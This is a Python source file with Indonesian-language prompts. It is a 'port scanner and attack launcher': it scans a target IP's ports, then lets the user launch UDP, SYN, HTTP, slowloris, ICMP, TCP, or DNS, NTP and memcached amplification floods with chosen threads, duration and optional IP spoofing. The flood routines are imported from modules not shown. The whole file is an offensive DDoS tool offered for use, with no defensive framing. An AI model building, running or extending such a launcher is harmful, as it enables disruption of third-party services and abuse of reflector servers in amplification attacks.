#!/usr/bin/env python3
import argparse
import socket
import threading
import time
import itertools
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===== ANSI COLORS =====
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ===== CONFIG =====
DEFAULT_PORT_FILE = os.path.join("port_nmap", "port1.txt")
SCAN_TIMEOUT = 0.5
MAX_WORKERS = 1000
SPINNER_CHARS = ['|', '/', '-', '\\']

def print_colored(text, color=WHITE, end='\n'):
    sys.stdout.write(f"{color}{text}{RESET}{end}")
    sys.stdout.flush()

def load_ports_from_file(filepath):
    """Load port list from file, one port per line."""
    if not os.path.exists(filepath):
        print_colored(f"[!] File {filepath} tidak ditemukan!", RED)
        return None
    ports = []
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line and line.isdigit():
                    port = int(line)
                    if 1 <= port <= 65535:
                        ports.append(port)
    except Exception as e:
        print_colored(f"[!] Gagal membaca file: {e}", RED)
        return None
    return ports

def scan_port(target, port, timeout=SCAN_TIMEOUT):
    """Scan single port. Return (port, open) tuple."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        result = sock.connect_ex((target, port))
        if result == 0:
            return (port, True)
        else:
            return (port, False)
    except Exception:
        return (port, False)
    finally:
        sock.close()

def show_spinner(stop_event):
    spinner = itertools.cycle(SPINNER_CHARS)
    while not stop_event.is_set():
        sys.stdout.write(f"\r{YELLOW}[!] Scanning ports... {next(spinner)}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 50 + "\r")
    sys.stdout.flush()

def scan_ports(target, ports):
    """Scan multiple ports using thread pool. Returns list of open ports."""
    open_ports = []
    lock = threading.Lock()
    stop_event = threading.Event()
    spinner_thread = threading.Thread(target=show_spinner, args=(stop_event,))
    spinner_thread.daemon = True
    spinner_thread.start()

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(scan_port, target, port): port for port in ports}
        for future in as_completed(futures):
            port, is_open = future.result()
            if is_open:
                with lock:
                    open_ports.append(port)

    stop_event.set()
    spinner_thread.join(timeout=1)
    elapsed = time.time() - start_time

    print_colored(f"\n[✓] Scanning selesai dalam {elapsed:.2f} detik", GREEN)
    print_colored(f"[✓] Total port dipindai: {len(ports)}", GREEN)
    print_colored(f"[✓] Port terbuka ditemukan: {len(open_ports)}", GREEN)

    return sorted(open_ports)

def display_open_ports(open_ports):
    """Display open ports in red, one per line."""
    if not open_ports:
        print_colored("[!] Tidak ada port terbuka.", RED)
        return
    print_colored("\n" + "=" * 60, BLUE)
    print_colored("           PORT TERBUKA DITEMUKAN           ", BOLD + RED)
    print_colored("=" * 60, BLUE)
    for port in open_ports:
        try:
            service = socket.getservbyport(port, 'tcp')
        except OSError:
            service = "unknown"
        print_colored(f"  [RED] {port:<5}  ->  {service}", RED)
    print_colored("=" * 60 + "\n", BLUE)

def choose_attack_and_execute(target, open_ports):
    """Prompt user for attack parameters and launch attack."""
    print_colored("\n" + "=" * 60, CYAN)
    print_colored("          SERANGAN DIMULAI          ", BOLD + RED)
    print_colored("=" * 60, CYAN)

    # Choose method
    methods = ["udp", "syn", "http", "slowloris", "icmp", "tcp", "dns", "ntp", "memcached"]
    print_colored("[?] Pilih method serangan:", YELLOW)
    for i, m in enumerate(methods, 1):
        print_colored(f"    {i}. {m}", WHITE)
    while True:
        try:
            choice = input(f"{GREEN}[+] Pilihan (1-{len(methods)}): {RESET}")
            idx = int(choice) - 1
            if 0 <= idx < len(methods):
                method = methods[idx]
                break
            else:
                print_colored("[!] Pilihan tidak valid!", RED)
        except ValueError:
            print_colored("[!] Masukkan angka!", RED)

    # Choose port (if open ports exist, let user pick one)
    target_port = None
    if open_ports:
        print_colored("\n[?] Pilih port target (dari daftar terbuka atau custom):", YELLOW)
        for i, p in enumerate(open_ports, 1):
            print_colored(f"    {i}. {p}", WHITE)
        print_colored(f"    {len(open_ports)+1}. Custom", WHITE)
        while True:
            try:
                choice = input(f"{GREEN}[+] Pilihan port: {RESET}")
                idx = int(choice) - 1
                if 0 <= idx < len(open_ports):
                    target_port = open_ports[idx]
                    break
                elif idx == len(open_ports):
                    custom = input(f"{GREEN}[+] Masukkan port custom: {RESET}")
                    if custom.isdigit() and 1 <= int(custom) <= 65535:
                        target_port = int(custom)
                        break
                    else:
                        print_colored("[!] Port tidak valid!", RED)
                else:
                    print_colored("[!] Pilihan tidak valid!", RED)
            except ValueError:
                print_colored("[!] Masukkan angka!", RED)
    else:
        port_input = input(f"{GREEN}[+] Masukkan port target: {RESET}")
        if port_input.isdigit() and 1 <= int(port_input) <= 65535:
            target_port = int(port_input)
        else:
            print_colored("[!] Port tidak valid, default ke 80", RED)
            target_port = 80

    # Threads
    threads_input = input(f"{GREEN}[+] Jumlah threads (default 100): {RESET}")
    threads = int(threads_input) if threads_input.isdigit() and int(threads_input) > 0 else 100

    # Duration
    duration_input = input(f"{GREEN}[+] Durasi serangan dalam detik (default 60): {RESET}")
    duration = int(duration_input) if duration_input.isdigit() and int(duration_input) > 0 else 60

    # IP spoofing
    spoof_choice = input(f"{GREEN}[+] Aktifkan IP spoofing? (y/n, default n): {RESET}").lower()
    spoof = spoof_choice == 'y'

    print_colored(f"\n[*] Melancarkan serangan {method.upper()} ke {target}:{target_port}", BOLD + RED)
    print_colored(f"[*] Threads: {threads}, Duration: {duration}s, Spoof: {spoof}", YELLOW)

    # Import attack modules dynamically
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from attacks import udp_flood, syn_flood, icmp_flood, tcp_flood, http_flood, slowloris, dns_amp, ntp_amp, memcached_amp
        from core.proxy_scraper import load_proxies, load_user_agents

        if method == "memcached":
            # Load all IPs for amplification
            from app import load_memcached_servers
            servers = load_memcached_servers()
            if servers:
                memcached_amp.attack(target, target_port, threads, duration, spoof, servers)
        else:
            attack_funcs = {
                "udp": udp_flood.attack,
                "syn": syn_flood.attack,
                "icmp": icmp_flood.attack,
                "tcp": tcp_flood.attack,
                "http": http_flood.attack,
                "slowloris": slowloris.attack,
                "dns": dns_amp.attack,
                "ntp": ntp_amp.attack,
            }
            attack_funcs[method](target, target_port, threads, duration, spoof)
    except ImportError as e:
        print_colored(f"[!] Gagal import modul serangan: {e}", RED)
        print_colored("[!] Pastikan struktur folder benar dan app.py tersedia.", RED)
    except Exception as e:
        print_colored(f"[!] Terjadi kesalahan saat serangan: {e}", RED)

def main():
    parser = argparse.ArgumentParser(description="Port Scanner + Attack Launcher")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--port-file", default=DEFAULT_PORT_FILE,
                        help=f"Path file berisi daftar port (default: {DEFAULT_PORT_FILE})")
    parser.add_argument("--timeout", type=float, default=SCAN_TIMEOUT,
                        help="Timeout per port (detik, default 0.5)")
    parser.add_argument("--threads", type=int, default=MAX_WORKERS,
                        help="Jumlah thread scanning (default 1000)")
    args = parser.parse_args()

    print_colored("\n" + "=" * 60, CYAN)
    print_colored("       PORT SCANNER & ATTACK LAUNCHER       ", BOLD + RED)
    print_colored("=" * 60 + "\n", CYAN)

    target = args.target
    port_file = args.port_file
    SCAN_TIMEOUT = args.timeout
    MAX_WORKERS = args.threads

    # Validate target
    try:
        socket.inet_aton(target)
    except socket.error:
        print_colored(f"[!] IP target tidak valid: {target}", RED)
        sys.exit(1)

    ports = load_ports_from_file(port_file)
    if ports is None:
        sys.exit(1)

    print_colored(f"[*] Target: {target}", BLUE)
    print_colored(f"[*] File port: {port_file} ({len(ports)} port)", BLUE)
    print_colored(f"[*] Timeout: {SCAN_TIMEOUT}s, Threads: {MAX_WORKERS}", BLUE)
    print_colored("[*] Memulai scanning...\n", YELLOW)

    open_ports = scan_ports(target, ports)

    display_open_ports(open_ports)

    # Ask if user wants to launch attack
    attack_choice = input(f"{GREEN}[?] Lancarkan serangan sekarang? (y/n): {RESET}").lower()
    if attack_choice == 'y':
        choose_attack_and_execute(target, open_ports)
    else:
        print_colored("[!] Keluar tanpa menyerang.", YELLOW)

if __name__ == "__main__":
    main()
